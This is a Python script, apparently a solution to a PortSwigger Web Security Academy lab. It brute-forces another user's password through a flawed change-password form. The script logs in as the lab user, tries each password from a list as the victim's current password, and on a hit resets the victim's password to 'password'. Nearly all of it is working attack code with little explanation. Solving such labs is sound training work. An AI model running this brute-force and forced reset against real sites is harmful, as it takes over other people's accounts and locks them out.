#https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-brute-force-via-password-change#
# march 16 2025, eug0r

import requests
import re
from pathlib import Path

url = f"https://0ae600d803238028d464864c005b0093.web-security-academy.net/"
login_page = url + "login"
my_account_page = url + "my-account?id=wiener"
pass_change_page = url + "my-account/change-password"
login_creds = {"username":"wiener", "password":"peter"} #your user creds

def grab_session(set_cookie_string):
    match = re.search(r'session=([^;]+)', set_cookie_string)
    if match:
        session_value = match.group(1)
        return session_value
    else:
        print("Session cookie not found")
#---------------------------------------------------------------------
def re_login():
    login_response = requests.post(login_page, data=login_creds, allow_redirects=False)
    #print (f"status code: {login_response.status_code}")
    set_cookie_string = login_response.headers['Set-Cookie']
    session = grab_session(set_cookie_string)
    return session


cwd = Path.cwd() 
print("Current Directory:", cwd)
file_path = cwd / "passwords.txt"  # path-to-your-passwords-file

with open(file_path, "r") as f:
    passwords = f.readlines()
for i in range(len(passwords)):
    passwords[i] = passwords[i].rstrip("\n")
#print(passwords)

for i, password in enumerate(passwords):
    session = re_login()
    myaccount_response  = requests.get(my_account_page,
                                        cookies= {"session":session})
    # if ("Your username is:" in myaccount_response.text):
    #     print("login successful")
    # else:
    #     print("couldn't log in") #for testing purpose
    creds = {
        'username':'carlos',
        'current-password':password,
        'new-password-1':'password', #automatically resets victim password to 'password'
        'new-password-2':'password'
    }
    pass_change_response = requests.post(pass_change_page, data=creds, cookies= {"session":session})
    print(f"{i}, pasword: {password}")
    if ("Password changed successfully" in pass_change_response.text): 
        print("\n\npassword changed\n\n")
        exit(0)
    else:
        print("not matched")



